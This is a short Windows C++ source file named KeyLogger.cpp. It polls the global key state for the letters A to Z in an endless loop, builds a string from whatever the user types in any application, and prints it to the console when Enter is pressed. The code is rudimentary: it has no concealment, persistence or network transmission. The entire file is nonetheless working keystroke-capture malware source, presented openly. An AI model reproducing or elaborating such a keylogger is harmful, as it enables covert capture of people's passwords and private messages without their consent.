// KeyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <iostream>
using namespace std;
string currentSentence = "";
void findLetterTyped() {

	char alphabet[26] = { 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z' };
	
	DWORD word = 0x41;
	for (int i = 0; i < 26; i++) {
		if (GetAsyncKeyState(word) & 1) { //Loops through every single letter until it finds the one with the least bit number changed 
			currentSentence += alphabet[i];
		}

		word++;
		if (GetAsyncKeyState(VK_RETURN) & 1) {
			cout << currentSentence << endl;
			currentSentence = "";
			return;
		}
	}

}


int main()
{
	while (1) {
		Sleep(1);
		findLetterTyped();
	}
}
